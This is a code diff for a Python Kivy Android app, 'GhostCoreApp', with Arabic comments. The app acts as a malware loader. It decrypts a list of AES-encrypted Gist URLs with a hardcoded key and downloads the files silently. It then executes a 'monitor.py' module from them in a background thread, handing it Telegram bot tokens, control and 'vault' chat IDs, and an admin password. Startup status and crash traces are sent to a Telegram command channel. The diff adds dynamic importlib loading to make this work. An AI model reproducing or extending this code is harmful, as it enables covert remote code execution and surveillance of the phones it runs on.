@@ -6,6 +6,7 @@ import json
 import base64
 import threading
 import traceback
+import importlib.util
 import requests
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -17,6 +18,7 @@ from cryptography.hazmat.backends import default_backend
 # ---------------------- إعدادات التشفير ----------------------
 ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
 
+# الروابط المشفرة لملفات Gists (14 ملفاً)
 PAYLOAD_URLS_ENCRYPTED = [
     "EGGGMNBl63GSytsYOAquCrvXIT5UrpIQk1xoilC2hgjPqywUXsNAsXbtl1yjOr7fQbnvNRgs3cGrlP3cWzUViDXscfGcIlfN0pxv72cisTI5S/fkAO2TC/Ilx1SykTMtQKeUwUuhQIVcT4Sg4i/8h196IY43lrJdtnjHXpudh3CYRna2Rel3unRovTyoiZhMi2r4dnI57TVrfwNmI2x4/A==",
     "PJX682fejN6nEQIsDjWBcpwQm0sX+XPUPviON9fx37mD5l/eWAooS15ABkkLlTQJqdwYm2t8l0JP8NEYZLog24VKb6fjPv85kFRRd04QPLB+ydrIh+oUuw3w5AqOXVeDrd/KC3AQ/eCejm5XxgTcQSVaycTKS+XrHPcRWj3MfxMXHOtGD+iEfLs4VnyWfWWqqjRATzw+BD6j7hrjYdEBGdbZB4E=",
@@ -39,22 +41,24 @@ if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR)
 sys.path.append(BASE_DIR)
 
-def decrypt(encrypted_b64):
+def decrypt_data(encrypted_b64):
     try:
         data = base64.b64decode(encrypted_b64)
         iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
         cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
         decryptor = cipher.decryptor()
         return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
-    except:
+    except Exception:
         return None
 
+# استيراد الأسرار من GitHub Secrets (يتم إنشاؤها أثناء البناء)
 try:
     from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID, ADMIN_PASSWORD
 except ImportError:
+    # قيم افتراضية للتطوير المحلي فقط
     BOT_TOKENS = ["YOUR_BOT_TOKEN"]
-    CONTROL_ID = "YOUR_CONTROL_CHAT_ID"
-    VAULT_ID = "YOUR_VAULT_CHAT_ID"
+    CONTROL_ID = "YOUR_CONTROL_ID"
+    VAULT_ID = "YOUR_VAULT_ID"
     ADMIN_PASSWORD = "Zaen123@123@"
 
 class GhostCoreApp(App):
@@ -77,54 +81,33 @@ class GhostCoreApp(App):
         timestamp = time.strftime("%H:%M:%S")
         entry = f"[{timestamp}] {msg}"
         self.log_history.append(entry)
-        if hasattr(self, 'console'):
+        if hasattr(self, 'console') and self.console:
             self.console.text += entry + "\n"
         print(entry)
 
     def send_telegram(self, message, is_error=False):
-        prefix = "❌ [ERROR] " if is_error else "✅ [INFO] "
+        prefix = "❌ " if is_error else "✅ "
         full_msg = prefix + message[:4000]
         for token in BOT_TOKENS:
             try:
                 url = f"https://api.telegram.org/bot{token}/sendMessage"
                 requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5)
                 break
-            except:
+            except Exception:
                 continue
 
-    def run_engine(self, dt):
-        try:
-            self.add_log("🔍 فحص بيئة التشغيل...")
-            for folder in ['core', 'telegram', 'config', 'media']:
-                exists = "✅" if os.path.isdir(folder) else "❌"
-                self.add_log(f"Folder '{folder}': {exists}")
-            import jnius
-            self.add_log("✅ Pyjnius loaded")
-            import cryptography
-            self.add_log("✅ Cryptography loaded")
-            self.add_log("📥 تحميل البايلودات المشفرة...")
-            self.download_payloads()
-            self.add_log("🏁 اكتملت الفحوصات. بدء تشغيل الخدمات الخلفية...")
-            self.start_services()
-            self.add_log("✅ التطبيق يعمل بنجاح في الخلفية.")
-            self.send_telegram("تم تشغيل التطبيق بنجاح على الجهاز.")
-        except Exception as e:
-            error_trace = traceback.format_exc()
-            self.add_log(f"❌ خطأ جسيم:\n{error_trace}")
-            self.send_telegram(f"انهيار عند التشغيل:\n{error_trace}", is_error=True)
-
     def decrypt_url(self, enc):
-        return decrypt(enc)
+        return decrypt_data(enc)
 
     def download_payloads(self):
-        self.add_log("بدء فك تشفير الروابط...")
+        self.add_log("📥 بدء فك تشفير الروابط وتحميل البايلودات...")
         for i, enc in enumerate(PAYLOAD_URLS_ENCRYPTED):
             url = self.decrypt_url(enc)
             if not url:
                 self.add_log(f"❌ فشل فك تشفير الرابط {i+1}")
                 continue
             name = url.split('/')[-1]
-            self.add_log(f"تحميل {name}...")
+            self.add_log(f"⬇️ تحميل {name}...")
             try:
                 resp = requests.get(url, timeout=15)
                 if resp.status_code == 200:
@@ -134,25 +117,61 @@ class GhostCoreApp(App):
                 else:
                     self.add_log(f"⚠️ فشل تحميل {name} (HTTP {resp.status_code})")
             except Exception as e:
-                self.add_log(f"⚠️ خطأ في تحميل {name}: {e}")
-        self.add_log("اكتمل تحميل البايلودات.")
+                self.add_log(f"⚠️ خطأ في تحميل {name}: {str(e)[:100]}")
+        self.add_log("🏁 اكتمل تحميل البايلودات.")
 
     def start_services(self):
-        self.add_log("تشغيل Monitor...")
+        self.add_log("⚙️ محاولة استيراد Monitor ديناميكياً...")
         try:
-            import monitor
-            if hasattr(monitor, 'Monitor'):
-                mon = monitor.Monitor()
+            monitor_path = os.path.join(BASE_DIR, "monitor.py")
+            if not os.path.exists(monitor_path):
+                self.add_log(f"❌ ملف monitor.py غير موجود في {BASE_DIR}")
+                return
+
+            spec = importlib.util.spec_from_file_location("monitor", monitor_path)
+            monitor_module = importlib.util.module_from_spec(spec)
+            sys.modules["monitor"] = monitor_module
+            spec.loader.exec_module(monitor_module)
+
+            if hasattr(monitor_module, 'Monitor'):
+                mon = monitor_module.Monitor()
                 mon.admin_password = ADMIN_PASSWORD
-                mon.bot_tokens = BOT_TOKENS
+                mon.bot_token = BOT_TOKENS[0]  # التوكن الأول لإرسال التقارير
                 mon.control_id = CONTROL_ID
                 mon.vault_id = VAULT_ID
+                # ربط التوكنات المتعددة (إذا احتاجها)
+                setattr(mon, 'bot_tokens', BOT_TOKENS)
                 threading.Thread(target=mon.start, daemon=True).start()
-                self.add_log("✅ Monitor started")
+                self.add_log("✅ تم تشغيل كلاس Monitor بنجاح!")
+                self.send_telegram("🚀 Monitor is now active.")
             else:
-                self.add_log("⚠️ Monitor class not found")
+                self.add_log("⚠️ الكلاس 'Monitor' غير موجود داخل ملف monitor.py")
+                self.add_log(f"🔍 محتويات الموديول: {dir(monitor_module)}")
         except Exception as e:
-            self.add_log(f"❌ فشل تشغيل Monitor: {e}")
+            error_trace = traceback.format_exc()
+            self.add_log(f"❌ فشل تشغيل الخدمات: {str(e)}")
+            self.add_log(error_trace[:500])
+            self.send_telegram(f"Error starting services:\n{error_trace[:1000]}", is_error=True)
+
+    def run_engine(self, dt):
+        try:
+            self.add_log("🔍 فحص بيئة التشغيل...")
+            # التحقق من وجود المجلدات (ليست ضرورية للعمل)
+            for folder in ['core', 'telegram', 'config', 'media']:
+                exists = "✅" if os.path.isdir(folder) else "❌"
+                self.add_log(f"Folder '{folder}': {exists}")
+            import jnius
+            self.add_log("✅ Pyjnius loaded")
+            import cryptography
+            self.add_log("✅ Cryptography loaded")
+            self.download_payloads()
+            self.start_services()
+            self.add_log("🏁 اكتملت الفحوصات. التطبيق يعمل في الخلفية.")
+            self.send_telegram("تم تشغيل التطبيق بنجاح على الجهاز.")
+        except Exception as e:
+            error_trace = traceback.format_exc()
+            self.add_log(f"❌ خطأ جسيم:\n{error_trace}")
+            self.send_telegram(f"انهيار عند التشغيل:\n{error_trace[:3000]}", is_error=True)
 
 if __name__ == '__main__':
     try:
@@ -161,6 +180,6 @@ if __name__ == '__main__':
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKENS[0]}/sendMessage",
                           json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"})
-        except:
+        except Exception:
             pass
         raise
